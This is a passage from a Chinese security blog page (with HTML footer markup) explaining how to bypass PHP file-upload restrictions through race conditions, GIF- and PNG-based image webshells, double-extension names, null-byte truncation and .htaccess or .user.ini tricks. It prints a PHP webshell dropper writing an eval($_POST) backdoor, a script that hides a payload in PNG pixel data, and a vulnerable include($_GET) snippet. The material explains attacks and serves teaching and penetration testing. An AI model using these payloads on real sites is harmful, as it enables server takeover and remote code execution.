+<h2 id="2-2-1-1-9-条件竞争绕过"><a href="#2-2-1-1-9-条件竞争绕过" class="headerlink" title="2.2.1.1.9 条件竞争绕过"></a>2.2.1.1.9 条件竞争绕过</h2><p>竞争条件原理介绍：<br>网站逻辑：</p>
+<ol>
+<li>网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。</li>
+<li>网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。</li>
+</ol>
+<p>在删除之前访问上传的php文件，从而执行上传文件中的php代码。<br>例如：上传文件代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先进行文件上传，后进行判断与删除。利用时间差进行webshell上传。</p>
+<h2 id="2-2-1-1-10-上传图片马配合文件解析漏洞绕过"><a href="#2-2-1-1-10-上传图片马配合文件解析漏洞绕过" class="headerlink" title="2.2.1.1.10 上传图片马配合文件解析漏洞绕过"></a>2.2.1.1.10 上传图片马配合文件解析漏洞绕过</h2><p>这里介绍两种图片马的制作和使用</p>
+<h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>比较简单，直接在图片格式的文件中加入 GIF89a 图片标识头（也可以修改hex：47 49 46 38 39 61）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将文件保存为 x.gif ，上传都服务器后需要配合文件包含漏洞来执行该代码<br><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582775243-466351-upload-labs15-2.png" alt="img"><br><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582775285-902970-upload-labs15-3.png" alt="img"></p>
+<blockquote>
+<p><strong>文件包含：</strong><br>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。<br>PHP中文件包含函数有以下四种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure>
+
+<p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p><strong>产生原因：</strong><br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>在某些 php 环境中会调用如 gd 库来验证上传是是否是图片文件，即使构造了一个图片文件，只要文件数据不符合图片标识数据，即拒绝上传，所以来看怎么构造一个符合图片标识数据的图片文件。</p>
+<p>下列代码，可以制作符合图片标识的图片文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//png.php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./pass17.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhzy@debian:~$  php payload.php  file.png</span><br></pre></td></tr></table></figure>
+
+<p>file.png 是一张普通的 png 图片~<br>最终生成 pass17.png<br>生成之后的文件同样需要配合文件包含漏洞来利用。</p>
+<h2 id="2-2-1-2-针对-linux-系统绕过"><a href="#2-2-1-2-针对-linux-系统绕过" class="headerlink" title="2.2.1.2 针对 linux 系统绕过"></a>2.2.1.2 针对 linux 系统绕过</h2><p>linux 不同与 windows 有着对于文件的不同的处理方式，所以一些绕过方式在 windows 上适用但是在 linux 上并不使用，然后我们来看如果在 linux 系统上的上传点有哪些可绕过利用方式。</p>
+<h2 id="2-2-1-2-1-使用其他可执行并且未限制的后缀名"><a href="#2-2-1-2-1-使用其他可执行并且未限制的后缀名" class="headerlink" title="2.2.1.2.1 使用其他可执行并且未限制的后缀名"></a>2.2.1.2.1 使用其他可执行并且未限制的后缀名</h2><p>该上传思路即为“没限制什么后缀就上传什么后缀”，可以使用之前的 burpsuite 测试后缀的方式测试可以上传哪些后缀，再构造相应马儿即可。（关于如何得知哪些后缀名可上传另参 2.2 ）</p>
+<h2 id="2-2-1-2-2-文件名双写绕过"><a href="#2-2-1-2-2-文件名双写绕过" class="headerlink" title="2.2.1.2.2 文件名双写绕过"></a>2.2.1.2.2 文件名双写绕过</h2><p>文件名双写在 linux 系统中仍然有效，但是大小写组合是不生效的。<br>例如这样的限制代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接使用双写绕过就行 x.pphphp ，最后生成 x.php 文件</p>
+<h2 id="2-2-1-2-3-00截断上传绕过"><a href="#2-2-1-2-3-00截断上传绕过" class="headerlink" title="2.2.1.2.3 00截断上传绕过"></a>2.2.1.2.3 00截断上传绕过</h2><blockquote>
+<p><strong>00截断</strong><br>无论0x00还是%00，最终被解析后都是一个东西:chr（0）<br>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p>
+<p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。<br>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。<br>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置。</p>
+</blockquote>
+<p>00截断在 php 环境中需要满足以下要求，二者缺一不可。</p>
+<ul>
+<li>php 版本小于 5.3.4</li>
+<li>php的magic_quotes_gpc为OFF状态</li>
+</ul>
+<h2 id="2-2-1-2-4-上传-access-文件"><a href="#2-2-1-2-4-上传-access-文件" class="headerlink" title="2.2.1.2.4 上传 .access 文件"></a>2.2.1.2.4 上传 .access 文件</h2><p>另参： 2.2.1.1.8<br>同样的原理绕过方式，配合解析漏洞，在 linux 环境中仍然适用，因为此类漏洞是 php 或者中间件造成的，操作系统不可控制该漏洞。</p>
+<h2 id="2-2-1-2-5-条件竞争绕过"><a href="#2-2-1-2-5-条件竞争绕过" class="headerlink" title="2.2.1.2.5 条件竞争绕过"></a>2.2.1.2.5 条件竞争绕过</h2><p>同样条件竞争造成的文件上传操作系统是不可控制的，该漏洞由 php 代码逻辑引发。<br>竞争条件原理介绍：<br>网站逻辑：</p>
+<ol>
+<li>网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。</li>
+<li>网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。</li>
+</ol>
+<p>在删除之前访问上传的php文件，从而执行上传文件中的php代码。<br>例如：上传文件代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先进行文件上传，后进行判断与删除。利用时间差进行webshell上传。</p>
+<h2 id="2-2-1-2-6-上传图片马配合文件解析漏洞绕过"><a href="#2-2-1-2-6-上传图片马配合文件解析漏洞绕过" class="headerlink" title="2.2.1.2.6 上传图片马配合文件解析漏洞绕过"></a>2.2.1.2.6 上传图片马配合文件解析漏洞绕过</h2><p>另参：2.2.1.1.10</p>
+<h2 id="2-2-2-白名单验证绕过"><a href="#2-2-2-白名单验证绕过" class="headerlink" title="2.2.2 白名单验证绕过"></a>2.2.2 白名单验证绕过</h2><blockquote>
+<p><strong>黑名单 &amp; 白名单</strong><br>这里的黑名单白名单指在上传点的限制方式，黑名单例如仅拒绝 xxx 格式上传，只要上传的内容不是 xxx 格式，文件均可以上传到服务器，对应的白名单即为仅允许上传 yyy 格式，只要不是 yyy 格式的文件全部拒绝上传。</p>
+</blockquote>
+<p>很显然白名单限制会比黑名单限制更为严格，黑名单只要没有限制完整即有可能上传，而白名单仅允许上传 xxx 文件，之外的一律拒绝。</p>
+<p>所以相比于黑名单，白名单的绕过方式会少很多。</p>
+<h2 id="2-2-2-1-上传图片马配合文件解析漏洞绕过"><a href="#2-2-2-1-上传图片马配合文件解析漏洞绕过" class="headerlink" title="2.2.2.1 上传图片马配合文件解析漏洞绕过"></a>2.2.2.1 上传图片马配合文件解析漏洞绕过</h2><p>因为后缀已经严格限制死了，所以我们只能上传符合规则的图片文件，那么我们就可以利用图片马再配合文件包含或者文件解析漏洞来绕过。</p>
+<p>如何生成该类图片文件另参：2.2.1.1.10</p>
+<h2 id="2-2-2-2-上传-access-文件绕过"><a href="#2-2-2-2-上传-access-文件绕过" class="headerlink" title="2.2.2.2 上传 .access 文件绕过"></a>2.2.2.2 上传 .access 文件绕过</h2><p>这里的 .access 只是一个泛例，具体包括 .htaccess 和 .user.ini 等可造成解析漏洞的文件。<br>具体利用方式另参：2.2.1.1.8</p>
+<h2 id="2-3-基于文件内容验证"><a href="#2-3-基于文件内容验证" class="headerlink" title="2.3 基于文件内容验证"></a>2.3 基于文件内容验证</h2><p>该限制方式既没有黑名单也没有白名单，而是靠识别上传的文件内容，符合图片标识数据则直接通过，反之则删除或拒绝，那么想要绕过的话需要我们制作符合图片文件标识的图片马。</p>
+<h2 id="2-3-1-上传图片马配合文件解析漏洞绕过"><a href="#2-3-1-上传图片马配合文件解析漏洞绕过" class="headerlink" title="2.3.1 上传图片马配合文件解析漏洞绕过"></a>2.3.1 上传图片马配合文件解析漏洞绕过</h2><p>如何制作符合图片标识的图片马另参：2.2.1.1.10</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/MOM - 蜡笔小心.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/犯错  - 小眼鑫.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/非酋 (王柏鸿 Remix) - 薛明媛.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/黑咻狂想曲（Cover：艾索） - 玖肆仟.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/忽而今夏（Cover：汪苏泷） - 耳朵玥.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/星茶会 - 灰澈.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/坠落星空 - 小星星Aurora.mp3"></li>
+                        
+                    
+                        
+                            <li title="7" data-url="https://cdn.jsdelivr.net/gh/GLSakura/CDN@3.1/mp3/最甜情歌 (女生版)  - 一玟.mp3"></li>
+                        
+                    
+                        
+                            <li title="8" data-url="https://api.uomg.com/api/rand.music"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
